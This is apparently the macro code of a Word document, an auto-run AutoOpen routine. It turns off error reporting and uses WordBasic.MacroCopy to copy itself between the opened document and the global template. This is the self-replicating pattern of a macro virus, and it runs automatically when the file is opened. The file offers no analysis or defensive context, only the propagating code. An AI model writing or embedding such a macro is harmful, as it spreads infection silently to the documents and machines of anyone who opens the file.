   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim a$
   Dim b$
   On Error Resume Next
   a$ = "AutoOpen"
   b$ = WordBasic.[FileName$]() + ":" + a$
   WordBasic.MacroCopy a$, b$, 1
   WordBasic.MacroCopy b$, a$, 1
   End Sub
